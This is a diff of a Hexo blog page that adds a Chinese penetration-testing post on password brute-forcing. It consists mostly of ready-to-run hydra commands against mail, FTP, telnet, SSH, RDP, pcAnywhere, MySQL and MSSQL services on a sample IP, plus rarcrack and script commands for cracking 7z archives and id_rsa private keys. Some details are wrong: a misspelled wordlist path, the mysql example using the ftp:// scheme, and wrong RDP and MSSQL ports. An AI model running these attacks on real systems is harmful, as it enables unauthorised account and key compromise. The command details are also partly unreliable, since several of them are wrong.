@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>密码破解工具最佳实践 | owefsad&#39;s blog</title>
+  <title>密码爆破最佳实践 | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介">
+  <meta name="description" content="渗透实战之后, 发现对服务、文件的密码爆破占了渗透15%左右, 因此写下这篇密码爆破的文章, 用来传播kali中爆破的魅力和小技巧. 当然每个人都会有自己的最佳实践命令, 此文着重介绍本渣在实战中的最佳实践, 不要模仿, 不要拿来做非法之事.本文根据遇到的服务持续更新…. 文章目录 密码爆破工具 不同类型的密码爆破 字典的选择">
+<meta name="keywords" content="暴力破解,hydra">
 <meta property="og:type" content="article">
-<meta property="og:title" content="密码破解工具最佳实践">
+<meta property="og:title" content="密码爆破最佳实践">
 <meta property="og:url" content="http://yoursite.com/2018/12/09/密码破解工具最佳实践/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
-<meta property="og:description" content="简介">
+<meta property="og:description" content="渗透实战之后, 发现对服务、文件的密码爆破占了渗透15%左右, 因此写下这篇密码爆破的文章, 用来传播kali中爆破的魅力和小技巧. 当然每个人都会有自己的最佳实践命令, 此文着重介绍本渣在实战中的最佳实践, 不要模仿, 不要拿来做非法之事.本文根据遇到的服务持续更新…. 文章目录 密码爆破工具 不同类型的密码爆破 字典的选择">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-09T00:53:25.609Z">
+<meta property="og:updated_time" content="2018-12-16T07:12:17.698Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="密码破解工具最佳实践">
-<meta name="twitter:description" content="简介">
+<meta name="twitter:title" content="密码爆破最佳实践">
+<meta name="twitter:description" content="渗透实战之后, 发现对服务、文件的密码爆破占了渗透15%左右, 因此写下这篇密码爆破的文章, 用来传播kali中爆破的魅力和小技巧. 当然每个人都会有自己的最佳实践命令, 此文着重介绍本渣在实战中的最佳实践, 不要模仿, 不要拿来做非法之事.本文根据遇到的服务持续更新…. 文章目录 密码爆破工具 不同类型的密码爆破 字典的选择">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -175,7 +176,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      密码破解工具最佳实践
+      密码爆破最佳实践
     </h1>
   
 
@@ -188,8 +189,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介<br><a id="more"></a></p>
-<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2>
+        <p>渗透实战之后, 发现对服务、文件的密码爆破占了渗透15%左右, 因此写下这篇密码爆破的文章, 用来传播kali中爆破的魅力和小技巧. 当然每个人都会有自己的最佳实践命令, 此文着重介绍本渣在实战中的最佳实践, 不要模仿, 不要拿来做非法之事.<br>本文根据遇到的服务持续更新….</p>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>密码爆破工具</li>
+<li>不同类型的密码爆破</li>
+<li>字典的选择</li>
+</ul>
+<a id="more"></a>
+<h2 id="密码爆破工具"><a href="#密码爆破工具" class="headerlink" title="密码爆破工具"></a>密码爆破工具</h2><p>实战中, 我常用的密码爆破有两类: kali自带工具、自己编写的小工具, 自己编写的工具自然不如hydra, 但是它适合用于内网横向渗透时, 无法安装hydra的场景<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali自带爆破工具</span></span><br><span class="line">hydra</span><br><span class="line">john the ripper</span><br></pre></td></tr></table></figure></p>
+<h2 id="不同类型的密码爆破"><a href="#不同类型的密码爆破" class="headerlink" title="不同类型的密码爆破"></a>不同类型的密码爆破</h2><p>实战中, 遇到的有基础服务的爆破, 如: ftp、ssh、telnet、imap、pop、smtp等; 文件的爆破, 如: id_rsa文件、zip压缩包文件等. 下面将分别介绍最佳实践</p>
+<h4 id="邮件服务-pop3-s-、imap-s-、-smtp-s"><a href="#邮件服务-pop3-s-、imap-s-、-smtp-s" class="headerlink" title="邮件服务: pop3[s]、imap[s]、 smtp[s]"></a>邮件服务: pop3[s]、imap[s]、 smtp[s]</h4><p>以pop3服务为例, imap服务、smtp服务与pop3服务的指定方式相同, 只需将协议改为imap即可。其中[s]表示使用ssl<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认端口 无ssl 特定用户 密码字典</span></span><br><span class="line">$ hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt -e nsr -V pop3://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认端口 ssl 特定用户 密码字典</span></span><br><span class="line">$ hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt -e nsr -V pop3s://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义端口 特定用户 密码字典 ssl指定方式如上所示</span></span><br><span class="line">$ hydra -l &lt;username&gt; -P /usr/share/wordlists/rouckyou.txt -e nsr -V pop3://10.129.10.51 -s &lt;port&gt;</span><br><span class="line">$ hydra -l &lt;username&gt; -P /usr/share/wordlists/rouckyou.txt -e nsr -V pop3://10.129.10.51:&lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义端口 ssl 用户字典 特定密码</span></span><br><span class="line">$ hydra -L /usr/share/wordlists/rockyou.txt -p &lt;password&gt; -V pop3://10.129.10.51 -s &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义端口 ssl 用户字典 密码字典</span></span><br><span class="line">$ hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -e nsr -V pop3s://10.129.10.51 -s &lt;port&gt;</span><br><span class="line">$ hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -e nsr -V pop3s://10.129.10.51 -s &lt;port&gt;</span><br></pre></td></tr></table></figure></p>
+<p>了解了邮件服务中提到的最佳实践之后, 下面的介绍的所有服务都是简单的替换协议</p>
+<h4 id="远程服务-ftp-s-、telnet-s-、ssh、rdp"><a href="#远程服务-ftp-s-、telnet-s-、ssh、rdp" class="headerlink" title="远程服务:ftp[s]、telnet[s]、ssh、rdp"></a>远程服务:ftp[s]、telnet[s]、ssh、rdp</h4><p>以默认端口、无ssl、特定用户、特定密码为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ftp[s]</span></span><br><span class="line">$ hydra -l ftp -p 123456 -e nsr -V ftp://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># telnet[s]</span></span><br><span class="line">$ hydra -l telnet -p 123456 -e nsr -V telnet://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh *nix远程登陆协议 22端口</span></span><br><span class="line">$ hydra -l ssh -p 123456 -e nsr -V ssh://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdp windows远程桌面 3380端口</span></span><br><span class="line">$ hydra -l administrator -p admin123456 -e nsr -V rdp://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># pcanywhere 远程控制软件 5631端口</span></span><br><span class="line">$ hydra -l admin -p 123456 -e nsr -V pcanywhere://10.129.10.51</span><br></pre></td></tr></table></figure></p>
+<h4 id="数据库服务-mysql、mssql、redis"><a href="#数据库服务-mysql、mssql、redis" class="headerlink" title="数据库服务: mysql、mssql、redis"></a>数据库服务: mysql、mssql、redis</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql mysql数据库 3306端口</span></span><br><span class="line">$ hydra -l mysql -p 123456 -e nsr -V ftp://10.129.10.51</span><br><span class="line"></span><br><span class="line"><span class="comment"># mssql sqlserver数据库 1443端口</span></span><br><span class="line">$ hydra -l sa -p 123456 -e nsr -V mssql://10.129.10.51</span><br></pre></td></tr></table></figure>
+<h4 id="文件爆破-7z、id-rsa"><a href="#文件爆破-7z、id-rsa" class="headerlink" title="文件爆破: 7z、id_rsa"></a>文件爆破: 7z、id_rsa</h4><p>我将文件爆破分为字典爆破和暴力破解两种, kali中的rarcrack用来暴力破解, 7z命令用来做字典爆破; 经过实战测试, 字典爆破的成功率略高<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rarcrack暴力破解</span></span><br><span class="line">$ rarcrack &lt;target&gt; --<span class="built_in">type</span> 7z --threads 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7z爆破字典爆破 [7z-crack](https://github.com/exexute/PythonScaffold/blob/PythonScaffold_0.1/enum_violence/file_enum/7z-crack.sh)</span></span><br><span class="line">$ ./7z-crack.sh /tmp/backup.7z /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id_rsa文件字典爆破 [id_rsa-crack](https://github.com/exexute/PythonScaffold/blob/PythonScaffold_0.1/enum_violence/file_enum/id_rsa-crack.sh)</span></span><br><span class="line">$ ./id_rsa-crack.sh /tmp/id_rsa /usr/share/wordlists/rouckyou.txt</span><br></pre></td></tr></table></figure>
+<h2 id="字典的选择"><a href="#字典的选择" class="headerlink" title="字典的选择"></a>字典的选择</h2><p>kali中自带了很多字典, 如:目录爆破、fuzz、命令注入等, 还有两个很有用的密码字典: rockyou.txt、fastcrack.txt<br>在爆破的过程中, 优先使用fastcrack字典, 因为该字典中保存的是最常出现的密码, 是rockyou的一个高频版和迷你版</p>
+
       
 
       
@@ -218,7 +234,33 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">暴力破解</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">hydra</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/tools//" class="article-tag-list-link color1">tools</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
 
@@ -439,35 +481,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">node rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">序列化与反序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">ss-manager</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">libdev命令注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tcpdukp提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">jenkins's vul</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">crontab's vul</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">hexo-beauty</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -483,11 +501,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tcpdump提权</a>
+                <a href="javascript:void(0)" class="js-tag color4">node rce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">序列化与反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">ss-manager命令注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">tcpdump提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">hexo-beauty</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">hydra</a>
               </li>
             
             <div class="clearfix"></div>
